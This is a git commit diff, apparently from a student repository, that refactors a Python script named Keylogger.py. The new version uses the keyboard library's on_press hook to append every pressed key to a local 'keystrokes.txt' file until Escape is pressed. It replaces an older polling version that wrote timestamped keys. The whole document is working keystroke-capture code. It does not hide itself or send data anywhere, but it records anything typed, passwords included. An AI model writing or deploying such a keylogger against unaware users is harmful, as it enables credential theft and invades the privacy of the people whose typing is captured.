24e5c57037878e5779885566ba3869fe199908f0
Rando980 <nabdalla000@student.rcschools.net>
2026-09-03 11:36:43 -0500

    Update Keylogger to use on_key_press event
    Refactor keylogger to use event-based logging and change log file name.

--- testfolder/Keylogger.py
+++ testfolder/Keylogger.py
@@ -1,25 +1,12 @@
 import keyboard
-import datetime
 
-# File to save keystrokes
-log_file = "key_log.txt"
+filename = "keystrokes.txt"
 
-# Function to log a key press
-def log_key(key):
-    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    with open(log_file, "a", encoding="utf-8") as f:
-        f.write(f"{timestamp} - {key}\n")
+def on_key_press(event):
+    with open(filename, "a") as f:
+        f.write(event.name + "\n")
 
-# Start listening for key events
-print("Keylogger started. Press Ctrl+C to stop.")
-try:
-    while True:
-        # Listen for key press events
-        if keyboard.is_pressed('esc'):
-            print("Stopping keylogger...")
-            break
-        # Log each key pressed
-        for key in keyboard.get_keys_pressed():
-            log_key(key)
-except KeyboardInterrupt:
-    print("Keylogger stopped.")
+keyboard.on_press(on_key_press)
+
+# Run the script until the user presses the escape key
+keyboard.wait("esc")
